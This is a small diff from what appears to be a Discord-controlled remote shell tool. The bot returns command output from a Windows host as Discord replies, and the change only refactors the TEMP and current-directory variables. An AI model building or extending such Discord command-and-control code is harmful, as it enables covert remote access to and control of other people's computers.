@@ -87,7 +87,7 @@ async def on_message(message):
         else:
             open(f"{TEMP}\\output.txt", "w").write(output)
             embed = discord.Embed(title=f"Shell > {CWD}", description="```See attachment```", color=0xfafafa)
-            file = discord.File(f"{os.getenv('TEMP')}\\output.txt")
+            file = discord.File(f"{TEMP}\\output.txt")
             return await message.reply(embed=embed, file=file)
-        embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
+        embed = discord.Embed(title=f"Shell > {CWD}", description=f"```{output}```", color=0xfafafa)
         await message.reply(embed=embed)
